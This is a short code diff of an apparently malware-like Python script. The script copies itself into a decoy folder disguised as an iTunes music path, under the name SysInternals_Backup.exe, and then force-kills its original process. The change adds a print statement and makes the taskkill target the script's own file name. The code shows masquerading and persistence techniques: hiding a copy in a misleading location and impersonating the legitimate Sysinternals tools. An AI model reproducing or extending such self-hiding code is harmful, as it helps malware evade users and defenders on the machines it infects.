@@ -38,6 +38,7 @@ try:
             print(os.getcwd())
             if os.getcwd() != (r"C:\Users\Public\AppData\Music\iTunes\U2\All_Music"):
               currentFileName = os.path.basename(__file__)
+              print(currentFileName)
               shutil.copy(currentFileName, r'C:\Users\Public\AppData\Music\iTunes\U2\All_Music\SysInternals_Backup.exe')
               print("Moved SysInt To Backup Location")
         except Exception as error:
@@ -54,7 +55,7 @@ try:
             sendToLog(error2)
         try:
                 #Stoping orinal file
-            subprocess.call("taskkill /f /im SysInternals.exe", shell=True)
+            subprocess.call("taskkill /f /im {}".format(currentFileName), shell=True)
         except Exception as error3:
             print("Could not TaskKill SysInternals.exe: {}\n {}".format(error, traceback.format_exc()))
             sendToLog(error3)
